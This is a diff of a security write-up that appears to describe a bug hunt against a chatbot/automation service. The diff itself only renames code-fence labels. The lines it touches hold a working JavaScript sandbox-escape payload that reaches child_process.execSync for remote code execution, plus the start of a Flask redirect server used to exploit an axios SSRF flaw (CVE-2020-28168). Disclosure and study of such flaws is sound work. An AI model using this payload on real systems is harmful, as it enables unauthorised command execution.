@@ -26,7 +26,7 @@ The bot didn't answer, but when I tried to use it again:
 
 So it was vulnerable. Then researching more about this vulnerability, I found that there is a way to get RCE by making the function constructor globaly available and then calling it:
 
-```js
+```js - payload.js
 o = constructor; o.assign(__proto__, o.getOwnPropertyDescriptor(o.getPrototypeOf(toString), "constructor")); f = value("return global.process.mainModule.constructor._load(`child_process`).execSync(`<cmd>`).toString()"); f(); x + 2
 ```
 
@@ -38,7 +38,7 @@ I put that with a CMD that sends a `curl` request to a canary token, and I got a
 
 Also; on another block called "Send an API request", I noticed that you were able to send any type of HTTP request, so I decided to look deeper on what was doing. They were using axios/0.14.1 and that was vulnerable to `CVE-2020-28168`, allowing me to bypass their proxy with just this dumb server:
 
-```python
+```python - app.py
 from flask import Flask, redirect
 
 app = Flask(__name__)
